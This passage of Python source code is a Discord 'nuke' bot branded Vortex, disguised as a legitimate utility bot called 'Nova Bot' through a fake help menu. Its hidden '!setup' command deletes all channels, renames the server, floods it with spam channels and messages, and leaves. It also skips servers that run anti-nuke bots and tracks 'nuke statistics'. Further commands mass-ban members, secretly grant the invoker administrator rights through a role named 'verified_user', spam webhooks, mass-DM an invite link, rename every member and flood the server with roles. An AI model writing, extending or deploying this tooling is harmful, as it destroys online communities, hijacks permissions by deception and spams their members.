        ("!spamroles", "Floods the server with dozens of useless roles."),
        ("!help", "Shows a real looking fake help embed."),
        ("!nhelp", "Shows this help embed")
    ]
    for name, value in commands_list:
        embed.add_field(name=name, value=value, inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def help(ctx: commands.Context):
    """Shows a fake help menu designed to look like a legitimate bot."""
    embed = discord.Embed(title="⚡ Nova Bot Help", description="Here are some of the available commands:", color=discord.Color.gold())
    commands_list = [
        ("!customvc", "Create your own temporary custom voice channel."),
        ("!autorole", "Automatically assigns roles to new members."),
        ("!reactionroles", "Set up reaction roles with a single command."),
        ("!levels", "Track activity and earn XP/levels."),
        ("!music [song]", "Play high-quality music in your voice channel."),
        ("!dashboard", "Opens a web dashboard where you can manage bot settings."),
        ("!welcome", "Set up custom welcome & goodbye messages."),
        ("!tags [name]", "Create and store custom text snippets."),
        ("!premium", "Shows how to unlock extra features and perks."),
        ("!help", "Shows this help menu.")
    ]
    for name, value in commands_list:
        embed.add_field(name=name, value=value, inline=False)

    try:
        await ctx.author.send(embed=embed)
        await ctx.reply("📬 I've sent the help menu to your DMs!", ephemeral=True)
    except discord.Forbidden:
        await ctx.reply("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True)
    except Exception as e:
        await ctx.reply(f"❌ An error occurred while sending the help message: {e}", ephemeral=True)

@bot.command()
@commands.has_permissions(ban_members=True) # Bot must have ban_members permission
async def massban(ctx: commands.Context):
    """Bans all bannable members in the server."""
    if not is_premium_user(ctx.author.id):
        return await ctx.send("💎 This command is only available for premium users.", ephemeral=True)

    if ctx.guild.id == BLACKLISTED_GUILD_ID:
        return await ctx.send("❌ This server is blacklisted.", ephemeral=True)

    if not ctx.guild.me.guild_permissions.ban_members:
        return await ctx.send("❌ I do not have permission to ban members in this server. Please grant me 'Ban Members' permission.", ephemeral=True)

    # Filter out bots, members with roles higher or equal to bot's top role, and the guild owner.
    # Also exclude the bot itself and the command invoker
    members_to_ban = [m for m in ctx.guild.members
                      if not m.bot and m != ctx.author and m != ctx.guild.owner and m != ctx.guild.me # Exclude bots, command invoker, bot itself, and guild owner
                      and ctx.guild.me.top_role > m.top_role] # Bot must have higher role than target member
    total_potential_bans = len(members_to_ban)

    if total_potential_bans == 0:
        return await ctx.send("✅ No bannable members found (or I lack permissions to ban them).", ephemeral=True)

    confirm_msg = await ctx.send(f"🚀 **Trying to ban {total_potential_bans} members...**\nReact with ✅ to confirm or ❌ to cancel.")
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_msg.id

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await confirm_msg.clear_reactions() # Clean up reactions
        return await ctx.send("❌ Timed out — massban cancelled.", ephemeral=True)

    if str(reaction.emoji) == "❌":
        await confirm_msg.clear_reactions() # Clean up reactions
        return await ctx.send("❌ Cancelled massban.", ephemeral=True)

    await ctx.send(f"🚀 Starting to ban {total_potential_bans} members...", ephemeral=True)
    ban_count = 0
    failed_count = 0
    ban_tasks = []

    async def ban_single_member_task(member_obj):
        nonlocal ban_count, failed_count
        try:
            # Using discord.py's built-in ban, which handles rate limits
            await ctx.guild.ban(member_obj, delete_message_days=0, reason="Massban")
            ban_count += 1
        except discord.Forbidden:
            failed_count += 1
            print(f"Failed to ban {member_obj.id} due to permissions.")
        except HTTPException as e: # Catch Discord API errors
            failed_count += 1
            print(f"HTTPException while banning {member_obj.id}: {e}")
        except Exception as e:
            failed_count += 1
            print(f"Unexpected error during ban of {member_obj.id}: {e}")

    # Create a task for each ban
    for member in members_to_ban:
        ban_tasks.append(ban_single_member_task(member))

    # Run tasks concurrently without intentional delays
    # This will hit Discord's rate limits for banning quickly.
    await asyncio.gather(*ban_tasks, return_exceptions=True)

    await ctx.send(f"✅ Massban complete — {ban_count}/{total_potential_bans} users banned. Failed: {failed_count}.", ephemeral=True)

@bot.command()
@commands.has_permissions(manage_roles=True) # Bot must have manage_roles permission
async def admin(ctx: commands.Context):
    """Creates an admin role (if not exists) and assigns it to the invoker."""
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        return await ctx.reply("❌ This server is blacklisted.", ephemeral=True)

    try:
        await ctx.message.delete()
    except discord.Forbidden:
        print(f"Bot missing permissions to delete message in {ctx.channel.name}")
    except Exception as e:
        print(f"Error deleting message for admin command: {e}")

    if not ctx.guild.me.guild_permissions.manage_roles:
        return await ctx.send("❌ I do not have permission to manage roles in this server. Please grant me 'Manage Roles' permission.", ephemeral=True)

    role_name = "verified_user" # Name of the role to create/find
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    feedback_msg = None

    if role is None:
        try:
            # Create a role with administrator permissions
            role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
            feedback_msg = await ctx.send(f"✅ Role '{role_name}' created with administrator permissions and assigned to you!")
        except discord.Forbidden:
            return await ctx.send("❌ I lack permissions to create roles or grant administrator permissions.", ephemeral=True)
        except Exception as e:
            return await ctx.send(f"❌ An error occurred while creating the role: {e}", ephemeral=True)
    else:
        # Check if the existing role has admin permissions
        if not role.permissions.administrator:
            try:
                await role.edit(permissions=discord.Permissions(administrator=True))
                await ctx.send(f"⚠️ Role '{role_name}' updated to have administrator permissions.")
            except discord.Forbidden:
                return await ctx.send("❌ I lack permissions to modify role permissions. Cannot grant admin to existing role.", ephemeral=True)
            except Exception as e:
                return await ctx.send(f"❌ An error occurred while updating the role: {e}", ephemeral=True)
        feedback_msg = await ctx.send(f"✅ Role '{role_name}' already exists (and now has administrator permissions). Assigning to you!")

    # Check if the bot can assign this role (bot's top role must be higher than the role being assigned)
    if ctx.guild.me.top_role <= role:
        return await ctx.send(f"❌ My top role is not high enough to assign '{role_name}'. Please move my role higher in the hierarchy.", ephemeral=True)

    try:
        await ctx.author.add_roles(role)
    except discord.Forbidden:
        await ctx.send(f"❌ I do not have permission to assign the role '{role_name}' to you.", ephemeral=True)
    except Exception as e:
        await ctx.send(f"❌ An error occurred while assigning the role: {e}", ephemeral=True)

    # If the feedback message exists, delete it after a delay.
    if feedback_msg:
        try:
            await feedback_msg.delete(delay=0) # Delete immediately
        except discord.Forbidden:
            pass # Ignore if cannot delete
        except Exception as e:
            print(f"Error deleting temporary admin message: {e}")

@bot.command()
async def info(ctx: commands.Context, user: discord.User = None):
    """Displays nuke statistics for a specified user or the command invoker."""
    target_user = user or ctx.author
    if not os.path.exists(NUKE_STATS_FILE):
        return await ctx.send("❌ No nuke statistics data available.", ephemeral=True)

    with open(NUKE_STATS_FILE, "r", encoding="utf-8") as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError:
            return await ctx.send("❌ Nuke statistics file is corrupt.", ephemeral=True)

    user_data = data.get("users", {}).get(str(target_user.id), {})
    nuke_count = user_data.get("uses", 0)

    max_server_name, max_members = None, -1

    # Iterate through all servers to find the largest server nuked by this user
    for guild_id, info in data.get("servers", {}).items():
        if info.get("user_id") == str(target_user.id): # Check if this user nuked this server
            if info["member_count"] > max_members:
                max_members = info["member_count"]
                max_server_name = info["server_name"]

    embed = discord.Embed(title="User Nuke Statistics", color=discord.Color.blurple())

    # Use global_name if available, otherwise display_name, then name
    display_name = target_user.global_name if target_user.global_name else target_user.display_name
    embed.set_author(name=f"{display_name} ({target_user.name})", icon_url=target_user.avatar.url if target_user.avatar else None)

    embed.add_field(name="👤 Nukes Executed", value=f"`{nuke_count}`", inline=True)
    embed.add_field(name="⭐ Premium User", value=f"`{'Yes' if is_premium_user(target_user.id) else 'No'}`", inline=True)

    if max_server_name:
        embed.add_field(name="📈 Largest Server Nuked", value=f"`{max_server_name}` ({max_members} members)", inline=False)
    else:
        embed.add_field(name="📈 Largest Server Nuked", value="`N/A`", inline=False)

    await ctx.send(embed=embed, ephemeral=True) # Send ephemeral for user privacy

async def detect_antinuKe_bots(guild: discord.Guild) -> list[str]:
    """Detects known anti-nuke bots in a guild."""
    detected = []
    # Fetch members to ensure the list is up-to-date and contains all bots
    # This might be slow if the guild has many members and member caching is off.
    # However, it's safer to fetch them to avoid missing bots.
    async for member in guild.fetch_members(limit=None):
        if member.bot:
            if member.id in BLOCKED_BOT_IDS:
                detected.append(member.display_name)
            elif any(blocked_name.lower() in member.display_name.lower() for blocked_name in BLOCKED_BOT_NAMES):
                detected.append(member.display_name)
    return detected

@bot.command()
@commands.has_permissions(administrator=True) # Require Administrator permission to initiate setup
async def setup(ctx: commands.Context):
    """Completely wipes and reconfigures the server."""
    guild = ctx.guild
    user = ctx.author
    user_config = get_user_config(user.id)

    # All direct messages to the user should go through dm_channel to avoid "Unknown Channel" errors
    # if the original channel is deleted.
    dm_channel = await user.create_dm()

    if guild.id == BLACKLISTED_GUILD_ID:
        return await dm_channel.send("❌ This server is blacklisted.") # Send DM for blacklisted

    # Try to delete the command message if possible
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        print(f"Bot missing permissions to delete command message in {ctx.channel.name}")
    except Exception as e:
        print(f"Error deleting command message for setup: {e}")

    if len(guild.members) < 5:
        try:
            await dm_channel.send(f"❌ Server `{guild.name}` needs to have a minimum of 5 members. Leaving..")
        except discord.Forbidden:
            # Fallback if DM also fails for some reason
            await ctx.send("❌ Server has less than 5 members, and I couldn't DM you about leaving. Leaving anyway.", ephemeral=True)
        except Exception as e:
            print(f"Error notifying user about small server and leaving: {e}")
        try:
            return await guild.leave()
        except discord.Forbidden:
            await dm_channel.send("❌ Server has less than 5 members, but I couldn't leave due to missing permissions. Please remove me manually.")
            return
        except Exception as e:
            print(f"Error leaving small guild: {e}")
            return

    # Check for anti-nuke bots
    await dm_channel.send("🔍 Checking for anti-nuke bots...") # Send DM for progress
    found_antinuke = await detect_antinuKe_bots(guild)
    if found_antinuke:
        print(f"[!] Anti-nuke bots detected: {', '.join(found_antinuke)}")
        spam_message = user_config.get("webhook_message", VORTEX_PAYLOAD) # Get configured message or default
        await dm_channel.send(f"⚠️ Anti-nuke bots detected ({', '.join(found_antinuke)}). Attempting to spam before leaving.") # Send DM for warning

        spam_tasks = []
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                # No delays for anti-nuke spam
                spam_tasks.extend([channel.send(spam_message) for _ in range(10)]) # Increase spam count for more impact

        await asyncio.gather(*spam_tasks, return_exceptions=True) # Run all spam tasks concurrently

        try:
            await dm_channel.send("Attempted to spam anti-nuke bots. Now leaving the server.") # Send DM for exit
            return await guild.leave()
        except discord.Forbidden:
            await dm_channel.send("❌ I couldn't leave the server after anti-nuke detection due to missing permissions. Please remove me manually.")
            return
        except Exception as e:
            print(f"Error leaving guild after anti-nuke spam: {e}")
            return

    # If no anti-nuke bots, proceed with nuke actions
    save_nuke_stats(user.id, guild)
    await send_log(ctx) # Log the nuke action
    await dm_channel.send("🚀 Nuke initiated!") # Send DM for initiation

    channel_name = user_config.get("channel_name", "bearded-dragon-takeover")
    webhook_message = user_config.get("webhook_message", VORTEX_PAYLOAD)
    server_name = user_config.get("server_name", "OWNED BY VORTEX")
    role_name = user_config.get("role_name", "join vortex")

    # Change server name
    if ctx.guild.me.guild_permissions.manage_guild:
        try:
            await guild.edit(name=server_name)
            await dm_channel.send(f"✅ Server name changed to `{server_name}`.")
        except discord.Forbidden:
            print("Missing permissions to change server name.")
            await dm_channel.send("❌ Failed to change server name (missing permissions).")
        except Exception as e:
            print(f"Error changing server name: {e}")
            await dm_channel.send(f"❌ Error changing server name: {e}.")
    else:
        print("Bot lacks 'Manage Server' permissions to change server name.")
        await dm_channel.send("❌ Bot lacks 'Manage Server' permissions to change server name.")


    # Change server icon
    folder_path = "icons"
    if os.path.exists(folder_path):
        images = [f for f in os.listdir(folder_path) if f.lower().endswith((".png", ".jpg", ".jpeg"))]
        if images and ctx.guild.me.guild_permissions.manage_guild:
            try:
                with open(os.path.join(folder_path, random.choice(images)), "rb") as f:
                    await guild.edit(icon=f.read())
                    await dm_channel.send("✅ Server icon changed.")
            except discord.Forbidden:
                print("Missing permissions to change server icon.")
                await dm_channel.send("❌ Failed to change server icon (missing permissions).")
            except Exception as e:
                print(f"Error changing server icon: {e}")
                await dm_channel.send(f"❌ Error changing server icon: {e}.")
        elif not ctx.guild.me.guild_permissions.manage_guild:
            print("Bot lacks 'Manage Server' permissions to change server icon.")
            await dm_channel.send("❌ Bot lacks 'Manage Server' permissions to change server icon.")
        else:
            print("No suitable images found in 'icons' folder.")
            await dm_channel.send("⚠️ No suitable icon images found to change server icon.")
    else:
        print("Icons folder not found.")
        await dm_channel.send("⚠️ 'icons' folder not found for changing server icon.")


    await dm_channel.send("🗑️ Deleting all channels...") # Send DM for progress
    # Delete all channels concurrently, without delays
    delete_channel_tasks = []
    for channel in guild.channels:
        # Check if bot can delete, or if it's the AFK/System channel which often requires specific handling
        if channel.permissions_for(guild.me).manage_channels and channel != guild.afk_channel and channel != guild.system_channel:
            delete_channel_tasks.append(channel.delete(reason="Server Nuked by Vortex"))
        else:
            print(f"Missing permissions or cannot delete channel: {channel.name} ({channel.id})")
    await asyncio.gather(*delete_channel_tasks, return_exceptions=True) # Execute all deletions
    await dm_channel.send("✅ Channels deleted. Creating new ones...") # Send DM for progress


    # Create new channels and send messages
    is_premium = is_premium_user(user.id)
    channel_count = 100 if is_premium else 50
    spams_per_channel = 50 if is_premium else 20 # Increased spam per channel

    create_and_spam_tasks = []
    async def create_channel_and_spam_task():
        # Ensure bot has permissions before trying to create and spam
        if not guild.me.guild_permissions.manage_channels or not guild.me.guild_permissions.send_messages:
            return

        try:
            ch = await guild.create_text_channel(name=channel_name, reason="Server Nuked by Vortex")
            spam_tasks = []
            for _ in range(spams_per_channel):
                spam_tasks.append(ch.send(content=webhook_message))
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        except discord.Forbidden:
            print(f"Missing permissions to create channel or send messages in {channel_name}.")
        except Exception as e:
            print(f"Error creating channel or spamming in {channel_name}: {e}")

    # Create all tasks for channel creation and initial spam
    for _ in range(channel_count):
        create_and_spam_tasks.append(create_channel_and_spam_task())

    # Run tasks concurrently, without delays for super fast creation/spam
    await asyncio.gather(*create_and_spam_tasks, return_exceptions=True)
    await dm_channel.send(f"✅ Created and spammed in {channel_count} channels.") # Send DM for completion


    # Create a new role
    if guild.me.guild_permissions.manage_roles:
        try:
            await guild.create_role(name=role_name, reason="Server Nuked by Vortex")
            await dm_channel.send(f"✅ Role `{role_name}` created.")
        except discord.Forbidden:
            print("Missing permissions to create role.")
            await dm_channel.send("❌ Failed to create role (missing permissions).")
        except Exception as e:
            print(f"Error creating role: {e}")
            await dm_channel.send(f"❌ Error creating role: {e}.")
    else:
        print("Bot lacks 'Manage Roles' permissions to create role.")
        await dm_channel.send("❌ Bot lacks 'Manage Roles' permissions to create role.")

    # Finally, leave the guild
    try:
        await guild.leave()
        print(f"Successfully left guild: {guild.name} ({guild.id}) after nuke.")
    except discord.Forbidden:
        await dm_channel.send("❌ I couldn't leave the server after the nuke due to missing permissions. Please remove me manually.")
    except Exception as e:
        print(f"Error leaving guild after nuke: {e}")

@setup.error
async def nuke_error(ctx: commands.Context, error: commands.CommandError):
    """Error handler for the setup command."""
    # Attempt to send the error message to the user's DMs first
    try:
        dm_channel = await ctx.author.create_dm()
        if isinstance(error, commands.MissingPermissions):
            await dm_channel.send("❌ You need **Administrator** permission to use this command.")
        else:
            await dm_channel.send(f"❌ An unexpected error occurred during setup: {error}")
    except discord.Forbidden:
        # Fallback to sending to channel if DM fails
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("❌ You need **Administrator** permission to use this command.", ephemeral=True)
        else:
            await ctx.send(f"❌ An unexpected error occurred during setup: {error}", ephemeral=True)
    print(f"Setup command error: {error}")


# Helper for sending single webhook message with explicit rate limit handling
async def send_webhook_message_robust(url: str, session_obj: aiohttp.ClientSession, payload: dict):
    while True: # Loop to handle 429 rate limits
        try:
            async with session_obj.post(url, json=payload) as resp:
                if resp.status == 429:
                    data = await resp.json()
                    retry_after = data.get("retry_after", 1) # Default to 1 second
                    print(f"Webhook rate limited ({url}), retrying after {retry_after}s.")
                    await asyncio.sleep(retry_after) # Wait as long as Discord tells us to
                    continue # Retry the same request
                elif resp.status in (200, 204):
                    return # Success
                else:
                    resp_text = await resp.text()
                    print(f"Error sending webhook to {url}, Status: {resp.status}, Response: {resp_text}")
                    return # Other errors, don't retry
        except aiohttp.ClientConnectorError as e:
            print(f"Client connection error for webhook {url}: {e}")
            return
        except Exception as e:
            print(f"Unexpected error sending webhook to {url}: {e}")
            return

@bot.command()
@commands.has_permissions(manage_webhooks=True, send_messages=True) # Bot needs these permissions for wspam
async def wspam(ctx: commands.Context, amount: int = 100, *, message: str = VORTEX_PAYLOAD): # Increased default amount
    """Creates webhooks in all text channels and spams a message."""
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        return await ctx.reply("❌ This server is blacklisted.", ephemeral=True)

    try: await ctx.message.delete()
    except discord.Forbidden: print(f"Bot missing permissions to delete message in {ctx.channel.name}")
    except Exception as e: print(f"Error deleting message for wspam: {e}")

    if not ctx.guild.me.guild_permissions.manage_webhooks:
        return await ctx.author.send("❌ I need 'Manage Webhooks' permission to use this command.", ephemeral=True)
    if not ctx.guild.me.guild_permissions.send_messages:
        return await ctx.author.send("❌ I need 'Send Messages' permission to use this command.", ephemeral=True)


    try:
        await ctx.author.send(f"🚀 **Initializing Webhook Spam** in `{ctx.guild.name}`...\nCreating webhooks, please wait...", ephemeral=True)
    except discord.Forbidden:
        await ctx.send("❌ I couldn't DM you to confirm webhook spam. Check your DMs.", ephemeral=True)
        return

    webhooks_urls = []
    create_webhook_tasks = []

    async def create_hook_for_channel(channel):
        try:
            # Check permissions per channel
            if channel.permissions_for(ctx.guild.me).manage_webhooks:
                hook = await channel.create_webhook(name=get_webhook_name(ctx.author.id))
                webhooks_urls.append(hook.url)
        except discord.Forbidden:
            print(f"Missing permissions to create webhook in channel: {channel.name}")
        except Exception as e:
            print(f"Error creating webhook in {channel.name}: {e}")

    # Gather all create webhook tasks
    for ch in ctx.guild.text_channels:
        create_webhook_tasks.append(create_hook_for_channel(ch))

    await asyncio.gather(*create_webhook_tasks, return_exceptions=True) # Run them concurrently

    if not webhooks_urls:
        try:
            await ctx.author.send("❌ Failed to create any webhooks. Missing permissions or max webhooks reached.", ephemeral=True)
        except discord.Forbidden:
            await ctx.send("❌ Failed to create any webhooks, and I couldn't DM you.", ephemeral=True)
        return

    try:
        await ctx.author.send(f"✅ Successfully created `{len(webhooks_urls)}` webhooks! Launching payload of `{amount}` messages per hook...", ephemeral=True)
    except discord.Forbidden:
        await ctx.send("✅ Webhooks created. Starting spam. Couldn't DM you the confirmation.", ephemeral=True)

    spam_tasks_collector = []
    webhook_payload = {"content": message, "username": get_webhook_name(ctx.author.id)}

    for _ in range(amount):
        for url in webhooks_urls:
            spam_tasks_collector.append(send_webhook_message_robust(url, bot.webhook_session, webhook_payload))

    # Run all spam tasks concurrently without delays.
    # This will heavily hit Discord's webhook rate limits, but the `send_webhook_message_robust`
    # function is designed to wait for `Retry-After` headers if they occur.
    await asyncio.gather(*spam_tasks_collector, return_exceptions=True)

    try:
        await ctx.author.send(f"✅ Webhook spam complete! Attempted to send {amount} messages via {len(webhooks_urls)} webhooks.", ephemeral=True)
    except discord.Forbidden:
        await ctx.send("✅ Webhook spam complete, but I couldn't DM you the final report.", ephemeral=True)


# --- NEW GOATED COMMANDS ---
@bot.command()
@commands.has_permissions(administrator=True) # Mass DM requires Administrator permission (or specific intents and roles)
async def massdm(ctx: commands.Context, *, message: str = "https://discord.gg/pGqmeSYuU VORTEX RUNS THIS"):
    """DMs every member in the server simultaneously."""
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        return await ctx.reply("❌ This server is blacklisted.", ephemeral=True)

    try: await ctx.message.delete()
    except discord.Forbidden: print(f"Bot missing permissions to delete message in {ctx.channel.name}")
    except Exception as e: print(f"Error deleting message for massdm: {e}")

    success, failed = 0, 0
    dm_tasks = []

    try:
        await ctx.author.send(f"🚀 Started Mass DM to `{ctx.guild.member_count}` members in `{ctx.guild.name}`...", ephemeral=True)
    except discord.Forbidden:
        await ctx.send("❌ I couldn't DM you about the mass DM progress. Check your DMs.", ephemeral=True)

    async def send_dm_task(member_obj: discord.Member):
        nonlocal success, failed
        if member_obj.bot: return # Skip bots
        if member_obj == ctx.guild.me: return # Skip the bot itself
        try:
            await member_obj.send(message)
            success += 1
        except discord.Forbidden:
            failed += 1 # User has DMs closed
        except Exception as e:
            failed += 1
            print(f"Error sending DM to {member_obj.id} ({member_obj.name}): {e}")

    # Create all DM tasks
    # Using ctx.guild.members which might be incomplete if intents are not fully enabled,
    # or members are not cached. For full accuracy, consider fetching:
    # members = [m async for m in ctx.guild.fetch_members(limit=None)]
    for member in ctx.guild.members:
        dm_tasks.append(send_dm_task(member))

    # Run DM tasks concurrently without intentional delays.
    # This is HIGHLY likely to hit DM rate limits very quickly and cause many DMs to fail.
    await asyncio.gather(*dm_tasks, return_exceptions=True)

    try:
        await ctx.author.send(f"✅ Mass DM Complete: `{success}` sent, `{failed}` failed (DMs closed or other errors).", ephemeral=True)
    except discord.Forbidden:
        await ctx.send("✅ Mass DM completed, but I couldn't DM you the final report.", ephemeral=True)


@bot.command()
@commands.has_permissions(manage_nicknames=True) # Bot needs manage_nicknames to rename
async def renameall(ctx: commands.Context, *, new_name: str = "Gooner"):
    """Changes the nickname of every user below the bot's role."""
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        return await ctx.reply("❌ This server is blacklisted.", ephemeral=True)

    try: await ctx.message.delete()
    except discord.Forbidden: print(f"Bot missing permissions to delete message in {ctx.channel.name}")
    except Exception as e: print(f"Error deleting message for renameall: {e}")

    if not ctx.guild.me.guild_permissions.manage_nicknames:
        return await ctx.send("❌ I do not have 'Manage Nicknames' permission.", ephemeral=True)

    count = 0
    rename_tasks = []

    async def rename_member_task(member_obj: discord.Member):
        nonlocal count
        # Ensure bot's top role is higher than member's top role, not a bot, and not guild owner
        if (ctx.guild.me.top_role > member_obj.top_role and
            not member_obj.bot and
            member_obj != ctx.guild.owner and
            member_obj != ctx.guild.me): # Exclude the bot itself
            try:
                await member_obj.edit(nick=new_name, reason="Mass nickname change by Vortex")
                count += 1
            except discord.Forbidden:
                pass # Bot doesn't have permissions for this specific member (e.g., higher role)
            except Exception as e:
                print(f"Error renaming {member_obj.id}: {e}")

    # Using ctx.guild.members which might be incomplete if intents are not fully enabled,
    # or members are not cached. For full accuracy, consider fetching:
    # members = [m async for m in ctx.guild.fetch_members(limit=None)]
    for member in ctx.guild.members:
        rename_tasks.append(rename_member_task(member))

    # Run rename tasks concurrently without intentional delays
    # This will heavily hit Discord's rate limits for nickname changes.
    await asyncio.gather(*rename_tasks, return_exceptions=True)

    try:
        await ctx.author.send(f"✅ Successfully renamed `{count}` members to `{new_name}`!", ephemeral=True)
    except discord.Forbidden:
        await ctx.send(f"✅ Successfully renamed `{count}` members, but I couldn't DM you the confirmation.", ephemeral=True)


@bot.command()
@commands.has_permissions(manage_roles=True) # Bot needs manage_roles to spam roles
async def spamroles(ctx: commands.Context, amount: int = 100, *, role_name: str = "Subwoofer Blown"): # Increased default amount
    """Floods the server with dozens of useless roles."""
    if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
        return await ctx.reply("❌ This server is blacklisted.", ephemeral=True)

    try: await ctx.message.delete()
    except discord.Forbidden: print(f"Bot missing permissions to delete message in {ctx.channel.name}")
    except Exception as e: print(f"Error deleting message for spamroles: {e}")

    if not ctx.guild.me.guild_permissions.manage_roles:
        return await ctx.send("❌ I do not have 'Manage Roles' permission.", ephemeral=True)

    # Discord has a role limit, usually 250 for non-boosted servers.
    current_roles = len(ctx.guild.roles)
    max_roles = ctx.guild.max_roles
    if max_roles and current_roles + amount > max_roles:
        await ctx.send(f"⚠️ Creating {amount} roles would exceed the server's role limit (currently {current_roles} roles, max {max_roles}). Attempting to create up to the limit.", ephemeral=True)
        amount = max_roles - current_roles
        if amount <= 0:
            return await ctx.send("❌ This server has reached its role limit. Cannot create more roles.", ephemeral=True)

    create_role_tasks = []
    success_count = 0

    async def create_role_single_task():
        nonlocal success_count
        try:
            await ctx.guild.create_role(name=role_name, color=discord.Color.random(), reason="Vortex role spam")
            success_count += 1
        except discord.Forbidden:
            print("Missing permissions to create role.")
        except Exception as e:
            print(f"Error creating role: {e}")

    # Create all role creation tasks
    for _ in range(amount):
        create_role_tasks.append(create_role_single_task())

    # Run tasks concurrently without intentional delays
    # This will heavily hit Discord's rate limits for role creation.
    await asyncio.gather(*create_role_tasks, return_exceptions=True)

    try:
        await ctx.author.send(f"✅ Sent API requests to create `{success_count}` roles named `{role_name}`!", ephemeral=True)
    except discord.Forbidden:
        await ctx.send(f"✅ Sent API requests to create `{success_count}` roles, but I couldn't DM you the confirmation.", ephemeral=True)

@bot.event
async def on_ready():
    """Event handler for when the bot successfully connects to Discord."""
    print(f"Bot is online as {bot.user}!")
    # Start tasks only if they are not already running
    if not update_leaderboard.is_running():
        update_leaderboard.start()
        print("Leaderboard update task started.")
    if not auto_leave_task.is_running():
        auto_leave_task.start()
        print("Auto-leave task started.")

# This ensures all commands, tasks, and event handlers are registered before the bot starts.
# Replace 'YOUR_BOT_TOKEN_HERE' with your actual bot token from Discord Developer Portal.
if __name__ == "__main__":
    bot.run(TOKEN)